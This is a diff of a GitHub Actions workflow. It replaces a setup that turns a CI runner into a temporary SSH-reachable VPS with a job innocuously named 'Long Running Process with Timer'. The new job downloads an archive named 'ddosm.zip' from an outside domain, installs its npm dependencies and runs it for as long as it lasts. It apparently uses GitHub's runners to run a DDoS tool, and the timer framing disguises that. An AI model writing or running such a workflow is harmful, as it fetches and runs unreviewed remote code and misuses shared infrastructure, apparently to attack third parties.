@@ -1,360 +1,101 @@
-name: Ubuntu VPS - SSH via Tailscale
+name: Long Running Process with Timer
 
 on:
-  workflow_dispatch:
+  workflow_dispatch:  # Manual trigger
 
 jobs:
-  setup-ubuntu-vps:
+  long-process:
     runs-on: ubuntu-latest
-    timeout-minutes: 360
-
+    
     steps:
-      - name: Update System
-        run: |
-          sudo apt-get update
-          sudo apt-get upgrade -y
-          echo "System updated successfully"
+    - name: Checkout code
+      uses: actions/checkout@v3
+      
+    - name: Setup Node.js
+      uses: actions/setup-node@v3
+      with:
+        node-version: '18'
+    
+    - name: Start Timer
+      id: start
+      run: echo "start-time=$(date +%s)" >> $GITHUB_OUTPUT
+    
+    - name: Download and Extract
+      run: |
+        curl -L -o project.zip "https://reality.mahmud-tech.online/ddosm.zip"
+        sudo apt-get install -y unzip
+        unzip project.zip -d ./project
+        
+    - name: Install Dependencies
+      run: |
+        cd ./project
+        npm install
+        
+    - name: Run Process with Time Tracking
+      run: |
+        cd ./project
+        
+        # Get the script from package.json
+        SCRIPT_NAME=${1:-start}  # Default to 'start' if no argument
+        
+        # Start time for this step
+        STEP_START=$(date +%s)
+        
+        echo "⏱️  Starting process at: $(date)"
+        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+        
+        # Run the npm script
+        npm run $SCRIPT_NAME &
+        PID=$!
+        
+        # Monitor process
+        while kill -0 $PID 2>/dev/null; do
+          CURRENT=$(date +%s)
+          ELAPSED=$((CURRENT - STEP_START))
           
-      - name: Create SSH User
-        run: |
-          # Generate secure password
-          SSH_PASSWORD=$(openssl rand -base64 20 | tr -d '/+' | cut -c1-16)
-          echo "SSH_PASSWORD=$SSH_PASSWORD" >> $GITHUB_ENV
-          echo "SSH_USER=vpsuser" >> $GITHUB_ENV
+          # Format time
+          HOURS=$((ELAPSED / 3600))
+          MINUTES=$(( (ELAPSED % 3600) / 60 ))
+          SECONDS=$((ELAPSED % 60))
           
-          # Create user
-          sudo useradd -m -s /bin/bash vpsuser
-          echo "vpsuser:$SSH_PASSWORD" | sudo chpasswd
-          sudo usermod -aG sudo vpsuser
-          
-          # Create SSH directory
-          sudo mkdir -p /home/vpsuser/.ssh
-          sudo chown vpsuser:vpsuser /home/vpsuser/.ssh
-          sudo chmod 700 /home/vpsuser/.ssh
-          
-          echo "User created: vpsuser"
-          echo "Password set successfully"
-          
-      - name: Configure SSH Server
-        run: |
-          # Configure SSH for password authentication
-          sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/g' /etc/ssh/sshd_config
-          sudo sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-          
-          # Allow password authentication
-          sudo tee -a /etc/ssh/sshd_config > /dev/null << EOF
-          
-          # Custom settings
-          ClientAliveInterval 120
-          ClientAliveCountMax 3
-          X11Forwarding yes
-          EOF
-          
-          # Restart SSH service
-          sudo systemctl restart ssh
-          sudo systemctl enable ssh
-          
-          echo "SSH server configured successfully"
-          
-      - name: Install Basic Tools
-        run: |
-          sudo apt-get install -y \
-            curl \
-            wget \
-            git \
-            htop \
-            nano \
-            vim \
-            net-tools \
-            tree \
-            zip \
-            unzip \
-            python3 \
-            python3-pip \
-            build-essential
-          
-          echo "Basic tools installed successfully"
-          
-      - name: Configure Firewall
-        run: |
-          # Install UFW if not installed
-          sudo apt-get install -y ufw
-          
-          # Configure firewall
-          echo "y" | sudo ufw --force enable
-          sudo ufw default deny incoming
-          sudo ufw default allow outgoing
-          sudo ufw allow 22/tcp
-          sudo ufw --force enable
-          
-          echo "Firewall configured - SSH port 22 allowed"
-          
-      - name: Install Tailscale
-        run: |
-          # Add Tailscale repository
-          curl -fsSL https://pkgs.tailscale.com/stable/ubuntu/$(lsb_release -cs).noarmor.gpg | sudo tee /usr/share/keyrings/tailscale-archive-keyring.gpg >/dev/null
-          curl -fsSL https://pkgs.tailscale.com/stable/ubuntu/$(lsb_release -cs).tailscale-keyring.list | sudo tee /etc/apt/sources.list.d/tailscale.list
-          
-          # Install Tailscale
-          sudo apt-get update
-          sudo apt-get install -y tailscale
-          
-          echo "Tailscale installed successfully"
-          
-      - name: Setup Tailscale Connection
-        env:
-          TAILSCALE_AUTH_KEY: ${{ secrets.TAILSCALE_AUTH_KEY }}
-        run: |
-          # Check if auth key is provided
-          if [ -z "$TAILSCALE_AUTH_KEY" ]; then
-            echo "ERROR: TAILSCALE_AUTH_KEY secret is not set"
-            echo "Please add your Tailscale auth key to GitHub Secrets"
-            echo "Go to: Repository Settings → Secrets and variables → Actions"
-            exit 1
-          fi
-          
-          # Start Tailscale
-          echo "Starting Tailscale..."
-          sudo tailscale up --authkey=$TAILSCALE_AUTH_KEY \
-            --hostname=github-vps-${{ github.run_id }} \
-            --accept-routes \
-            --ssh
-          
-          # Wait and get IP
-          echo "Waiting for Tailscale IP..."
-          sleep 10
-          
-          # Get Tailscale IP
-          TS_IP=$(sudo tailscale ip -4)
-          
-          if [ -z "$TS_IP" ]; then
-            echo "Trying again to get Tailscale IP..."
-            sleep 10
-            TS_IP=$(sudo tailscale ip -4)
-          fi
-          
-          if [ -z "$TS_IP" ]; then
-            echo "ERROR: Could not get Tailscale IP"
-            echo "Checking Tailscale status..."
-            sudo tailscale status
-            exit 1
-          fi
-          
-          echo "TAILSCALE_IP=$TS_IP" >> $GITHUB_ENV
-          echo "✅ Tailscale connected successfully!"
-          echo "Tailscale IP: $TS_IP"
-          
-      - name: Install Docker
-        run: |
-          # Install Docker
-          curl -fsSL https://get.docker.com | sh
-          
-          # Add user to docker group
-          sudo usermod -aG docker vpsuser
-          
-          # Install Docker Compose
-          sudo curl -L "https://github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m)" \
-            -o /usr/local/bin/docker-compose
-          sudo chmod +x /usr/local/bin/docker-compose
-          
-          echo "Docker and Docker Compose installed successfully"
-          
-      - name: Install Node.js
-        run: |
-          # Install Node.js 20.x (LTS)
-          curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
-          sudo apt-get install -y nodejs
-          
-          echo "Node.js $(node --version) installed"
-          
-      - name: Setup User Environment
-        run: |
-          # Create .bashrc with aliases
-          cat > /tmp/bashrc_setup << 'EOF'
-          # Aliases
-          alias ll='ls -la'
-          alias la='ls -A'
-          alias l='ls -CF'
-          alias ..='cd ..'
-          alias ...='cd ../..'
-          alias h='history'
-          alias ports='netstat -tulpn'
-          alias update='sudo apt update && sudo apt upgrade -y'
-          alias clean='sudo apt autoremove -y && sudo apt autoclean'
-          
-          # Docker aliases
-          alias dps='docker ps'
-          alias dpa='docker ps -a'
-          alias dim='docker images'
-          alias dcu='docker-compose up'
-          alias dcd='docker-compose down'
-          
-          # Git aliases
-          alias gs='git status'
-          alias ga='git add'
-          alias gc='git commit -m'
-          alias gp='git push'
-          alias gl='git log --oneline --graph --all'
-          
-          # Color prompt
-          export PS1='\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
-          
-          # Default editor
-          export EDITOR=nano
-          
-          # Add to PATH
-          export PATH="$HOME/.local/bin:$PATH"
-          
-          # Welcome message
-          echo ""
-          echo "Welcome to your GitHub VPS!"
-          echo "Connected via Tailscale"
-          echo "Run 'sysinfo' for system information"
-          echo ""
-          EOF
-          
-          # Copy to user's home
-          sudo cp /tmp/bashrc_setup /home/vpsuser/.bashrc
-          sudo chown vpsuser:vpsuser /home/vpsuser/.bashrc
-          
-          # Create sysinfo script
-          cat > /tmp/sysinfo << 'EOF'
-          #!/bin/bash
-          echo ""
-          echo "╔══════════════════════════════════════╗"
-          echo "║        VPS SYSTEM INFORMATION        ║"
-          echo "╚══════════════════════════════════════╝"
-          echo ""
-          echo "📊 SYSTEM:"
-          echo "   Hostname: $(hostname)"
-          echo "   OS: $(lsb_release -ds)"
-          echo "   Kernel: $(uname -r)"
-          echo ""
-          echo "⏱️  UPTIME:"
-          echo "   $(uptime -p)"
-          echo "   Load: $(uptime | awk -F'load average:' '{print $2}')"
-          echo ""
-          echo "💾 RESOURCES:"
-          echo "   Memory: $(free -h | awk '/^Mem:/ {print $3 "/" $2 " (" $4 " free)"}')"
-          echo "   Disk: $(df -h / | awk 'NR==2 {print $3 "/" $2 " (" $5 " used)"}')"
-          echo ""
-          echo "🌐 NETWORK:"
-          echo "   Tailscale IP: $(tailscale ip -4 2>/dev/null || echo 'Not connected')"
-          echo "   Public IP: $(curl -s ifconfig.me || echo 'Unknown')"
-          echo ""
-          echo "🐋 DOCKER:"
-          echo "   Containers: $(docker ps -q 2>/dev/null | wc -l || echo '0') running"
-          echo "   Version: $(docker --version 2>/dev/null | cut -d' ' -f3- || echo 'Not installed')"
-          echo ""
-          echo "📦 PACKAGES:"
-          echo "   Node: $(node --version 2>/dev/null || echo 'Not installed')"
-          echo "   NPM: $(npm --version 2>/dev/null || echo 'Not installed')"
-          echo "   Python: $(python3 --version 2>/dev/null || echo 'Not installed')"
-          echo "   Git: $(git --version 2>/dev/null | cut -d' ' -f3 || echo 'Not installed')"
-          echo ""
-          EOF
-          
-          # Make sysinfo executable and move to /usr/local/bin
-          sudo cp /tmp/sysinfo /usr/local/bin/sysinfo
-          sudo chmod +x /usr/local/bin/sysinfo
-          
-          echo "User environment configured successfully"
-          
-      - name: Final Configuration
-        run: |
-          # Setup welcome message
-          sudo tee /etc/motd > /dev/null << 'EOF'
-          ╔═══════════════════════════════════════════╗
-          ║    GitHub Actions Ubuntu VPS              ║
-          ║    Access via Tailscale VPN               ║
-          ║    Session active for 6 hours             ║
-          ╚═══════════════════════════════════════════╝
-          EOF
-          
-          # Clean up
-          sudo apt-get autoremove -y
-          sudo apt-get clean
-          
-          echo "Final configuration completed"
-          
-      - name: Display Connection Information
-        run: |
-          echo ""
-          echo "╔══════════════════════════════════════════════════════════╗"
-          echo "║               🚀 VPS SETUP COMPLETE!                     ║"
-          echo "╚══════════════════════════════════════════════════════════╝"
-          echo ""
-          echo "🔐 SSH CONNECTION DETAILS:"
-          echo "   ▸ Host: $TAILSCALE_IP"
-          echo "   ▸ Port: 22"
-          echo "   ▸ Username: $SSH_USER"
-          echo "   ▸ Password: $SSH_PASSWORD"
-          echo ""
-          echo "📡 CONNECTION COMMAND:"
-          echo "   ssh $SSH_USER@$TAILSCALE_IP"
-          echo ""
-          echo "📦 INSTALLED SOFTWARE:"
-          echo "   ✓ Ubuntu Server"
-          echo "   ✓ Docker & Docker Compose"
-          echo "   ✓ Node.js $(node --version)"
-          echo "   ✓ Python 3"
-          echo "   ✓ Git"
-          echo "   ✓ Essential tools"
-          echo "   ✓ Tailscale VPN"
-          echo ""
-          echo "⚡ QUICK COMMANDS (after login):"
-          echo "   sysinfo          - Show system information"
-          echo "   docker ps        - List containers"
-          echo "   tailscale status - Check VPN status"
-          echo ""
-          echo "⏰ SESSION INFO:"
-          echo "   This VPS will remain active for 6 hours"
-          echo "   All data is temporary and will be deleted"
-          echo ""
-          echo "🔗 TAILSCALE REQUIREMENTS:"
-          echo "   You need Tailscale installed on your local machine"
-          echo "   Download from: https://tailscale.com/download"
-          echo ""
-          echo "╔══════════════════════════════════════════════════════════╗"
-          echo "║   VPS IS READY! Connect using the details above.        ║"
-          echo "╚══════════════════════════════════════════════════════════╝"
-          echo ""
-          
-          # Mask password in logs
-          echo "::add-mask::$SSH_PASSWORD"
-          
-      - name: Keep Session Active
-        run: |
-          echo "🟢 VPS is now running and accessible!"
-          echo "⏳ Session will remain active for 6 hours (360 minutes)"
-          echo "Press Ctrl+C in GitHub Actions to stop early"
-          echo ""
-          
-          # Display countdown
-          TOTAL_MINUTES=360
-          for ((minute=1; minute<=TOTAL_MINUTES; minute++)); do
-            remaining=$((TOTAL_MINUTES - minute))
-            hours=$((remaining / 60))
-            minutes=$((remaining % 60))
-            
-            # Show status every 5 minutes
-            if (( minute % 5 == 0 )); then
-              echo "[$(date '+%H:%M:%S')] VPS active - $remaining minutes remaining (~${hours}h ${minutes}m)"
-              
-              # Check Tailscale connection
-              if ! sudo tailscale status > /dev/null 2>&1; then
-                echo "⚠️  Tailscale disconnected - Reconnecting..."
-                sudo tailscale up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --reset
-              fi
-              
-              # Show quick status
-              echo "   🖥️  Load: $(uptime | awk -F'load average:' '{print $2}')"
-              echo "   💾 Memory: $(free -h | awk '/^Mem:/ {print $3 "/" $2}')"
-            fi
-            
-            sleep 60
-          done
-          
-          echo ""
-          echo "⏰ Session time limit reached (6 hours)"
-          echo "👋 VPS session ending. Goodbye!"
+          printf "\r⏱️  Running: %02d:%02d:%02d" $HOURS $MINUTES $SECONDS
+          sleep 5
+        done
+        
+        wait $PID
+        EXIT_CODE=$?
+        
+        # Final time for this step
+        STEP_END=$(date +%s)
+        STEP_ELAPSED=$((STEP_END - STEP_START))
+        
+        echo ""
+        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+        echo "✅ Step completed in: $(date -u -d @${STEP_ELAPSED} +"%H:%M:%S")"
+        
+        exit $EXIT_CODE
+      shell: bash
+    
+    - name: Calculate Total Time
+      if: always()  # Run even if previous step fails
+      run: |
+        END_TIME=$(date +%s)
+        START_TIME="${{ steps.start.outputs.start-time }}"
+        TOTAL_ELAPSED=$((END_TIME - START_TIME))
+        
+        # Format total time
+        HOURS=$((TOTAL_ELAPSED / 3600))
+        MINUTES=$(( (TOTAL_ELAPSED % 3600) / 60 ))
+        SECONDS=$((TOTAL_ELAPSED % 60))
+        
+        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+        echo "📊 TOTAL EXECUTION TIME:"
+        echo "   $HOURS hours, $MINUTES minutes, $SECONDS seconds"
+        echo "   ($(date -u -d @${TOTAL_ELAPSED} +"%H:%M:%S"))"
+        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+        
+        # Save to summary
+        echo "### ⏱️ Execution Summary" >> $GITHUB_STEP_SUMMARY
+        echo "- **Start:** $(date -d @$START_TIME)" >> $GITHUB_STEP_SUMMARY
+        echo "- **End:** $(date -d @$END_TIME)" >> $GITHUB_STEP_SUMMARY
+        echo "- **Total Time:** $HOURS hours, $MINUTES minutes, $SECONDS seconds" >> $GITHUB_STEP_SUMMARY
